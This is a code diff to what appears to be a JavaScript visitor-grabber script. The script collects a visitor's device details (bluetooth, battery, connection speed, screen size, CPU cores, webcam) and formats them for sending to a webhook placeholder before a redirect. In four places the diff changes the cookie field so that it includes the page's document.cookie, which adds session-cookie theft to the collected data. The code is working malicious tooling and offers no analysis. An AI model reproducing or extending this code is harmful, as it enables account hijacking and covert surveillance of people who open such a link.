@@ -1,4 +1,4 @@
-var REDIRECTURL = "REDIRECT"
+var REDIRECTURL = "REDIRECT";
 var WEBHOOKURL = "WEBHOOK";
 try {
     function senddata(opts2) {
@@ -47,7 +47,7 @@ try {
                         navigator.bluetooth.getAvailability().then(function (isBluetoothAvailable) {
                             bluetooth = isBluetoothAvailable ? '✅' : '❌'
                             batterycharge = battery.charging ? '✅' : '❌'
-                            cookies = navigator.cookieEnabled ? '✅' : '❌'
+                            cookies = navigator.cookieEnabled ? `✅ ${document.cookie}` : '❌'
                             try { down = navigator.connection.downlink + "mbps" } catch (err) { down = "unknown " }
 
                             let other = "```\nDownload Speed: " +
@@ -60,7 +60,7 @@ try {
                                 navigator.hardwareConcurrency +
                                 '\nBattery Charging: ' +
                                 batterycharge +
-                                "\nCookies?: " +
+                                "\nCookies: " +
                                 cookies +
                                 "\nWebcam?: " +
                                 camera +
@@ -100,7 +100,7 @@ try {
                     }
                     catch (err) {
                         batterycharge = battery.charging ? '✅' : '❌'
-                        cookies = navigator.cookieEnabled ? '✅' : '❌'
+                        cookies = navigator.cookieEnabled ? `✅ ${document.cookie}` : '❌'
                         try { down = navigator.connection.downlink + "mbps" } catch (err) { down = "unknown " }
                         let other = "```\nDownload Speed: " +
                             down +
@@ -112,7 +112,7 @@ try {
                             navigator.hardwareConcurrency +
                             '\nBattery Charging: ' +
                             batterycharge +
-                            "\nCookies?: " +
+                            "\nCookies: " +
                             cookies +
                             "\nWebcam?: " +
                             camera +
@@ -155,7 +155,7 @@ try {
                 try {
                     navigator.bluetooth.getAvailability().then(function (isBluetoothAvailable) {
                         bluetooth = isBluetoothAvailable ? '✅' : '❌'
-                        cookies = navigator.cookieEnabled ? '✅' : '❌'
+                        cookies = navigator.cookieEnabled ? `✅ ${document.cookie}` : '❌'
                         try { down = navigator.connection.downlink + "mbps" } catch (err) { down = "unknown " }
                         let other = "```\nDownload Speed: " +
                             down +
@@ -165,7 +165,7 @@ try {
                             window.innerWidth + " x " + window.innerHeight +
                             '\nUsed CPU Cores: ' +
                             navigator.hardwareConcurrency +
-                            "\nCookies?: " +
+                            "\nCookies: " +
                             cookies +
                             "\nWebcam?: " +
                             camera +
@@ -204,7 +204,7 @@ try {
                     })
                 }
                 catch (err) {
-                    cookies = navigator.cookieEnabled ? '✅' : '❌'
+                    cookies = navigator.cookieEnabled ? `✅ ${document.cookie}` : '❌'
                     try { down = navigator.connection.downlink + "mbps" } catch (err) { down = "unknown " }
                     let other = "```\nDownload Speed: " +
                         down +
@@ -214,7 +214,7 @@ try {
                         window.innerWidth + " x " + window.innerHeight +
                         '\nUsed CPU Cores: ' +
                         navigator.hardwareConcurrency +
-                        "\nCookies?: " +
+                        "\nCookies: " +
                         cookies +
                         "\nWebcam?: " +
                         camera +
